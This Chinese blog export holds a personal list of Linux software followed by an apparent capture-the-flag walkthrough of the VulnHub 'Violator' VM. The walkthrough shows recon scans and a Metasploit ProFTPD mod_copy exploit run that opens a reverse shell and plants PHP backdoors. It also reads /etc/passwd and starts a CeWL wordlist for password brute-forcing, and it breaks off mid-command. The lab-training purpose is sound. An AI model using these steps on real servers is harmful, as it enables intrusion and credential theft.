        <content type="html"><![CDATA[<h3 id="远程桌面类的"><a href="#远程桌面类的" class="headerlink" title="远程桌面类的"></a>远程桌面类的</h3><ul><li>远程桌面查看器，vinagre：支持多种协议</li><li>Remmina：这个也不错</li><li>TeamView：有时会用到</li></ul><a id="more"></a><h3 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h3><ul><li>Tilix：不知道为什么选这个终端，因为可以设置背景图片。</li><li>zsh：加上Oh-My-Zsh</li></ul><h3 id="效率工具"><a href="#效率工具" class="headerlink" title="效率工具"></a>效率工具</h3><ul><li>主菜单，alacarte：一个可以创建快捷方式的工具</li><li>Evolution：收发邮件，日程表。</li><li>Vim：神级编辑器</li><li>Zeal：开发文档，可以快速搜索，支持订阅</li><li>albert：快捷搜索打开软件</li><li>stardict：可以离线翻译，可以导入字典。</li><li>Typora：Markdown编辑器</li><li>Maltego：信息收集神器</li><li>Xmind：脑图</li></ul><h3 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h3><ul><li>清理工具，BleachBit：功能强大</li><li>杀毒软件，ClamAV：开源免费还可以查杀Windows系统的威胁；ClamTK：ClamAV的GUI版本，可以安装插件添加右键扫描文件夹。</li><li>输入法，搜狗输入法：符合国人输入习惯，支持云联想。</li><li>Wireshark-QT版：流量数据分析</li><li>WPS：办公软件</li><li>deepin-screenshot：很像QQ的截图功能，可以选定窗口截图，同时还可以编辑。</li><li>Nmap：神器</li><li>Timeshift：系统备份还原工具</li><li>Shadowsocks-Qt5：代理</li></ul><h3 id="视频影音"><a href="#视频影音" class="headerlink" title="视频影音"></a>视频影音</h3><ul><li>录屏推流软件，OBS：免费开源插件多</li><li>音乐播放器，网易云音乐：比较好看，但本地的我一般使用Cmus</li><li>VLC：免费开源插件多，可以拉流。</li></ul><h3 id="娱乐"><a href="#娱乐" class="headerlink" title="娱乐"></a>娱乐</h3><ul><li><p>PlayOnLinux：可以安装很多Windows上的游戏</p></li><li><p>Steam：一个游戏平台</p></li></ul><h3 id="聊天软件"><a href="#聊天软件" class="headerlink" title="聊天软件"></a>聊天软件</h3><ul><li>qTox：P2P加密聊天软件，功能强大</li><li>TIM：腾讯的</li><li>WeChat：腾讯的</li><li>electronic-wechat：网页版微信</li></ul><h3 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h3><ul><li>Transmission：解析种子的</li><li>uGet：还行</li><li>百度云盘：有时候会用到</li><li>rslsycn：P2P大文件同步工具</li></ul><h3 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h3><ul><li>Idea全套</li><li>anaconda：管理Python库和环境的</li><li>sublime-Text3：轻量级编辑器</li><li>vscode：这个编辑器牛逼，开源的力量。</li><li>OpenCV：开源计算机视觉库</li><li>Tensorflow：神经网络模型和深度学习框架</li><li>dbeaver：强大的数据库管理套件</li></ul><h3 id="虚拟化"><a href="#虚拟化" class="headerlink" title="虚拟化"></a>虚拟化</h3><ul><li>docker：搭建环境很方便</li><li>VMware Workstations：商业虚拟机，没Vbox这么多BUG</li><li>Vbox：有时候用到</li></ul><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><ul><li>Chrome</li><li>Firefox</li><li>Tor-Browser</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Write-up-Violator</title>
      <link href="/2018/08/06/Write-up-Violator/"/>
      <url>/2018/08/06/Write-up-Violator/</url>
      
        <content type="html"><![CDATA[<h3 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h3><ul><li>下载地址：<a href="https://download.vulnhub.com/violator/violator.ova" target="_blank" rel="noopener">点我</a></li><li>Flag：/root/flag.txt</li><li>哔哩哔哩：<a href="https://www.bilibili.com/video/av28803525/" target="_blank" rel="noopener">视频</a></li></ul><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li>网卡：虚拟机vmnet8</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ip addr show dev vmnet8 </span><br><span class="line">5: vmnet8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000</span><br><span class="line">    link/ether 00:50:56:c0:00:08 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.16.249.1/24 brd 172.16.249.255 scope global vmnet8</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::250:56ff:fec0:8/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br><span class="line">➜  ~ nmap -T4 -A 172.16.249.1/24</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-06 08:09 CST</span><br><span class="line">Nmap scan report for 172.16.249.1</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT    STATE SERVICE         VERSION</span><br><span class="line">902/tcp open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.16.249.129</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     ProFTPD 1.3.5rc3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: I Say... I say... I say Boy! You pumpin' for oil or somethin'...?</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 256 IP addresses (2 hosts up) scanned in 72.25 seconds</span><br></pre></td></tr></table></figure><ol><li>IP：172.16.249.129，Ubuntu开放端口21和80。主页里有一张图片和一个wiki的链接，可能是突破口。</li></ol><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl -L http://172.16.249.129/</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;I Say... I say... I say Boy! You pumpin' for oil or somethin'...?&lt;/title&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;br&gt;I Say.. I say... I say boy!  You're barkin up the wrong tree!&lt;/br&gt;</span><br><span class="line">    &lt;img src="foggie.jpg" alt="foggie.jpg" height=1041" width="731"&gt;</span><br><span class="line">   &lt;-- https://en.wikipedia.org/wiki/Violator_(album)  --&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li>不是WordPress框架，还是用nikto扫一下吧，什么也没发现，看了foggie.jpg的exif信息也没发现。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ nikto -h http://172.16.249.129/</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ Target IP:          172.16.249.129</span><br><span class="line">+ Target Hostname:    172.16.249.129</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ <span class="keyword">Start</span> <span class="built_in">Time</span>:         <span class="number">2018</span><span class="number">-08</span><span class="number">-06</span> <span class="number">08</span>:<span class="number">16</span>:<span class="number">20</span> (GMT8)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="keyword">Server</span>: Apache/<span class="number">2.4</span><span class="number">.7</span> (Ubuntu)</span><br><span class="line">+ <span class="keyword">Server</span> leaks inodes via ETags, header <span class="keyword">found</span> <span class="keyword">with</span> <span class="keyword">file</span> /, <span class="keyword">fields</span>: <span class="number">0x13e</span> <span class="number">0x53518115c6709</span> </span><br><span class="line">+ The <span class="keyword">anti</span>-clickjacking X-Frame-Options header <span class="keyword">is</span> <span class="keyword">not</span> present.</span><br><span class="line">+ The X-XSS-<span class="keyword">Protection</span> header <span class="keyword">is</span> <span class="keyword">not</span> defined. This header can hint <span class="keyword">to</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> protect against <span class="keyword">some</span> forms <span class="keyword">of</span> XSS</span><br><span class="line">+ The X-<span class="keyword">Content</span>-<span class="keyword">Type</span>-Options header <span class="keyword">is</span> <span class="keyword">not</span> set. This could <span class="keyword">allow</span> the <span class="keyword">user</span> <span class="keyword">agent</span> <span class="keyword">to</span> render the <span class="keyword">content</span> <span class="keyword">of</span> the site <span class="keyword">in</span> a different fashion <span class="keyword">to</span> the MIME <span class="keyword">type</span></span><br><span class="line">+ <span class="keyword">No</span> CGI Directories <span class="keyword">found</span> (<span class="keyword">use</span> <span class="string">'-C all'</span> <span class="keyword">to</span> <span class="keyword">force</span> <span class="keyword">check</span> <span class="keyword">all</span> possible dirs)</span><br><span class="line">+ Apache/<span class="number">2.4</span><span class="number">.7</span> appears <span class="keyword">to</span> be outdated (<span class="keyword">current</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="keyword">least</span> Apache/<span class="number">2.4</span><span class="number">.12</span>). Apache <span class="number">2.0</span><span class="number">.65</span> (<span class="keyword">final</span> <span class="keyword">release</span>) <span class="keyword">and</span> <span class="number">2.2</span><span class="number">.29</span> <span class="keyword">are</span> also current.</span><br><span class="line">+ Allowed <span class="keyword">HTTP</span> Methods: <span class="keyword">GET</span>, <span class="keyword">HEAD</span>, POST, OPTIONS </span><br><span class="line">+ OSVDB<span class="number">-3233</span>: /icons/README: Apache <span class="keyword">default</span> <span class="keyword">file</span> found.</span><br><span class="line">+ <span class="number">7535</span> requests: <span class="number">0</span> <span class="keyword">error</span>(s) <span class="keyword">and</span> <span class="number">7</span> item(s) reported <span class="keyword">on</span> remote host</span><br><span class="line">+ <span class="keyword">End</span> <span class="built_in">Time</span>:           <span class="number">2018</span><span class="number">-08</span><span class="number">-06</span> <span class="number">08</span>:<span class="number">16</span>:<span class="number">28</span> (GMT8) (<span class="number">8</span> <span class="keyword">seconds</span>)</span><br><span class="line"><span class="comment">---------------------------------------------------------------------------</span></span><br><span class="line">+ <span class="number">1</span> host(s) tested</span><br></pre></td></tr></table></figure><ol start="2"><li>所以目标转向了FTP，在nmap的返回结果中可看到<code>ProFTPD 1.3.5rc3</code>，找相关版本是否存在漏洞。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ searchsploit ProFTPD 1.3.5</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- --------------------------------------------------------------</span><br><span class="line"> Exploit Title                                                                                                            |  Path</span><br><span class="line">                                                                                                                          | (/home/kali-team/Kali-Team/exploit-database/)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- --------------------------------------------------------------</span><br><span class="line">ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                 | exploits/linux/remote/37262.rb</span><br><span class="line">ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                       | exploits/linux/remote/36803.py</span><br><span class="line">ProFTPd 1.3.5 - File Copy                                                                                                 | exploits/linux/remote/36742.txt</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------------- --------------------------------------------------------------</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul><li>三个漏洞都可以利用，这里使用第一个Metasploit框架中的，比较方便。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/unix/ftp/proftpd_modcopy_exec </span><br><span class="line">msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/ftp/proftpd_modcopy_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                       yes       The target address</span><br><span class="line">   RPORT      80               yes       HTTP port (TCP)</span><br><span class="line">   RPORT_FTP  21               yes       FTP port</span><br><span class="line">   SITEPATH   /var/www         yes       Absolute writable website path</span><br><span class="line">   SSL        false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path to the website</span><br><span class="line">   TMPPATH    /tmp             yes       Absolute writable path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   ProFTPD 1.3.5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set rhost 172.16.249.129</span><br><span class="line">rhost =&gt; 172.16.249.129</span><br><span class="line">msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; set sitepath /var/www/html</span><br><span class="line">sitepath =&gt; /var/www/html</span><br><span class="line">msf exploit(unix/ftp/proftpd_modcopy_exec) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.249.1:4444 </span><br><span class="line">[*] 172.16.249.129:80 - 172.16.249.129:21 - Connected to FTP server</span><br><span class="line">[*] 172.16.249.129:80 - 172.16.249.129:21 - Sending copy commands to FTP server</span><br><span class="line">[*] 172.16.249.129:80 - Executing PHP payload /O8hgrL.php</span><br><span class="line">[*] Command shell session 1 opened (172.16.249.1:4444 -&gt; 172.16.249.129:33406) at 2018-08-06 14:10:35 +0800</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">O8hgrL.php</span><br><span class="line">foggie.jpg</span><br><span class="line">i0KEqK.php</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure><ul><li>系统是Ubuntu，所以路径设置为<code>/var/www/html</code>，目录下的两个PHP文件就是Metasploit生成的后门。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/false</span><br><span class="line">messagebus:x:102:106::/var/run/dbus:/bin/false</span><br><span class="line">landscape:x:103:109::/var/lib/landscape:/bin/false</span><br><span class="line">dg:x:1000:1000:Dave Gahan,,,:/home/dg:/bin/bash</span><br><span class="line">proftpd:x:104:65534::/var/run/proftpd:/bin/false</span><br><span class="line">ftp:x:105:65534::/srv/ftp:/bin/false</span><br><span class="line">mg:x:1001:1001:Martin Gore:/home/mg:/bin/bash</span><br><span class="line">af:x:1002:1002:Andrew Fletcher:/home/af:/bin/bash</span><br><span class="line">aw:x:1003:1003:Alan Wilder:/home/aw:/bin/bash</span><br><span class="line">uname -a</span><br><span class="line">Linux violator 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure><ul><li>发现有几个用户名<code>dg mg af aw</code>，上传到服务器试了，有提权漏洞，但www-data不能用sudo。</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="meta">@violator</span>:<span class="regexp">/var/</span>www<span class="regexp">/html$ cat /</span>etc/group</span><br><span class="line">cat <span class="regexp">/etc/</span>group</span><br><span class="line"><span class="string">root:</span><span class="string">x:</span><span class="number">0</span>:</span><br><span class="line"><span class="string">daemon:</span><span class="string">x:</span><span class="number">1</span>:</span><br><span class="line"><span class="string">bin:</span><span class="string">x:</span><span class="number">2</span>:</span><br><span class="line"><span class="string">sys:</span><span class="string">x:</span><span class="number">3</span>:</span><br><span class="line"><span class="string">adm:</span><span class="string">x:</span><span class="number">4</span>:syslog,dg</span><br><span class="line"><span class="string">tty:</span><span class="string">x:</span><span class="number">5</span>:</span><br><span class="line"><span class="string">disk:</span><span class="string">x:</span><span class="number">6</span>:</span><br><span class="line"><span class="string">lp:</span><span class="string">x:</span><span class="number">7</span>:</span><br><span class="line"><span class="string">mail:</span><span class="string">x:</span><span class="number">8</span>:</span><br><span class="line"><span class="string">news:</span><span class="string">x:</span><span class="number">9</span>:</span><br><span class="line"><span class="string">uucp:</span><span class="string">x:</span><span class="number">10</span>:</span><br><span class="line"><span class="string">man:</span><span class="string">x:</span><span class="number">12</span>:</span><br><span class="line"><span class="string">proxy:</span><span class="string">x:</span><span class="number">13</span>:</span><br><span class="line"><span class="string">kmem:</span><span class="string">x:</span><span class="number">15</span>:</span><br><span class="line"><span class="string">dialout:</span><span class="string">x:</span><span class="number">20</span>:</span><br><span class="line"><span class="string">fax:</span><span class="string">x:</span><span class="number">21</span>:</span><br><span class="line"><span class="string">voice:</span><span class="string">x:</span><span class="number">22</span>:</span><br><span class="line"><span class="string">cdrom:</span><span class="string">x:</span><span class="number">24</span>:dg</span><br><span class="line"><span class="string">floppy:</span><span class="string">x:</span><span class="number">25</span>:</span><br><span class="line"><span class="string">tape:</span><span class="string">x:</span><span class="number">26</span>:</span><br><span class="line"><span class="string">sudo:</span><span class="string">x:</span><span class="number">27</span>:dg</span><br><span class="line"><span class="string">audio:</span><span class="string">x:</span><span class="number">29</span>:</span><br><span class="line"><span class="string">dip:</span><span class="string">x:</span><span class="number">30</span>:dg</span><br><span class="line">www-<span class="string">data:</span><span class="string">x:</span><span class="number">33</span>:</span><br><span class="line"><span class="string">backup:</span><span class="string">x:</span><span class="number">34</span>:</span><br><span class="line"><span class="string">operator:</span><span class="string">x:</span><span class="number">37</span>:</span><br><span class="line"><span class="string">list:</span><span class="string">x:</span><span class="number">38</span>:</span><br><span class="line"><span class="string">irc:</span><span class="string">x:</span><span class="number">39</span>:</span><br><span class="line"><span class="string">src:</span><span class="string">x:</span><span class="number">40</span>:</span><br><span class="line"><span class="string">gnats:</span><span class="string">x:</span><span class="number">41</span>:</span><br><span class="line"><span class="string">shadow:</span><span class="string">x:</span><span class="number">42</span>:</span><br><span class="line"><span class="string">utmp:</span><span class="string">x:</span><span class="number">43</span>:</span><br><span class="line"><span class="string">video:</span><span class="string">x:</span><span class="number">44</span>:</span><br><span class="line"><span class="string">sasl:</span><span class="string">x:</span><span class="number">45</span>:</span><br><span class="line"><span class="string">plugdev:</span><span class="string">x:</span><span class="number">46</span>:dg</span><br><span class="line"><span class="string">staff:</span><span class="string">x:</span><span class="number">50</span>:</span><br><span class="line"><span class="string">games:</span><span class="string">x:</span><span class="number">60</span>:</span><br><span class="line"><span class="string">users:</span><span class="string">x:</span><span class="number">100</span>:mg,af,aw</span><br><span class="line"><span class="string">nogroup:</span><span class="string">x:</span><span class="number">65534</span>:</span><br><span class="line"><span class="string">libuuid:</span><span class="string">x:</span><span class="number">101</span>:</span><br><span class="line"><span class="string">netdev:</span><span class="string">x:</span><span class="number">102</span>:</span><br><span class="line"><span class="string">crontab:</span><span class="string">x:</span><span class="number">103</span>:</span><br><span class="line"><span class="string">syslog:</span><span class="string">x:</span><span class="number">104</span>:</span><br><span class="line"><span class="string">fuse:</span><span class="string">x:</span><span class="number">105</span>:</span><br><span class="line"><span class="string">messagebus:</span><span class="string">x:</span><span class="number">106</span>:</span><br><span class="line"><span class="string">mlocate:</span><span class="string">x:</span><span class="number">107</span>:</span><br><span class="line"><span class="string">ssh:</span><span class="string">x:</span><span class="number">108</span>:</span><br><span class="line"><span class="string">landscape:</span><span class="string">x:</span><span class="number">109</span>:</span><br><span class="line"><span class="string">dg:</span><span class="string">x:</span><span class="number">1000</span>:</span><br><span class="line"><span class="string">lpadmin:</span><span class="string">x:</span><span class="number">110</span>:dg</span><br><span class="line"><span class="string">sambashare:</span><span class="string">x:</span><span class="number">111</span>:dg</span><br><span class="line">ssl-<span class="string">cert:</span><span class="string">x:</span><span class="number">112</span>:</span><br><span class="line"><span class="string">mg:</span><span class="string">x:</span><span class="number">1001</span>:</span><br><span class="line"><span class="string">af:</span><span class="string">x:</span><span class="number">1002</span>:</span><br><span class="line"><span class="string">aw:</span><span class="string">x:</span><span class="number">1003</span>:</span><br></pre></td></tr></table></figure><ul><li>能sudo的只有dg一个用户，去翻一下各个用户的home目录。然后找到下面的信息。</li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/af</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">minarke-<span class="number">1.21</span>  minarke-<span class="number">1.21</span>.tar.bz2</span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/aw</span><span class="variable">$ </span>file hint</span><br><span class="line">file hint</span><br><span class="line"><span class="symbol">hint:</span> ASCII text</span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/aw</span><span class="variable">$ </span>cat hint</span><br><span class="line">cat hint</span><br><span class="line">You are getting close... Can you crack the final enigma..?</span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/aw</span><span class="variable">$ </span></span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home</span><span class="variable">$ </span>ls dg</span><br><span class="line">ls dg</span><br><span class="line">bd</span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/mg</span><span class="variable">$ </span>file faith_and_devotion</span><br><span class="line">file faith_and_devotion</span><br><span class="line"><span class="symbol">faith_and_devotion:</span> ASCII text</span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/mg</span><span class="variable">$ </span>cat faith_and_devotion</span><br><span class="line">cat faith_and_devotion</span><br><span class="line"><span class="symbol">Lyrics:</span></span><br><span class="line"></span><br><span class="line">* Use Wermacht <span class="keyword">with</span> <span class="number">3</span> rotors</span><br><span class="line">* Reflector to B</span><br><span class="line"><span class="symbol">Initial:</span> A B C</span><br><span class="line">Alphabet <span class="symbol">Ring:</span> C B A</span><br><span class="line">Plug Board A-B, C-D</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@violator</span><span class="symbol">:/home/mg</span>$</span><br></pre></td></tr></table></figure><ul><li>全部复制到<code>/var/www/html</code>下载会本地。思路断了，外国的东西看不懂。然后看会了前期发现的wiki。想到了用CeWL把wiki的单词爬下来当字典，爆破那四个用户。<a href="https://tools.kali.org/password-attacks/cewl" target="_blank" rel="noopener">CeWL</a>的说明介绍。我其实是把专辑和歌名那一部分去掉空格作为密码字典的。</li></ul><blockquote><p>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  CeWL git:(master) ✗ ./cewl.rb -v 'https://en.wikipedia.org/wiki/Violator_(album)' -d 1 -w pass.txt</span><br><span class="line">➜  CeWL git:(master) ✗ cat 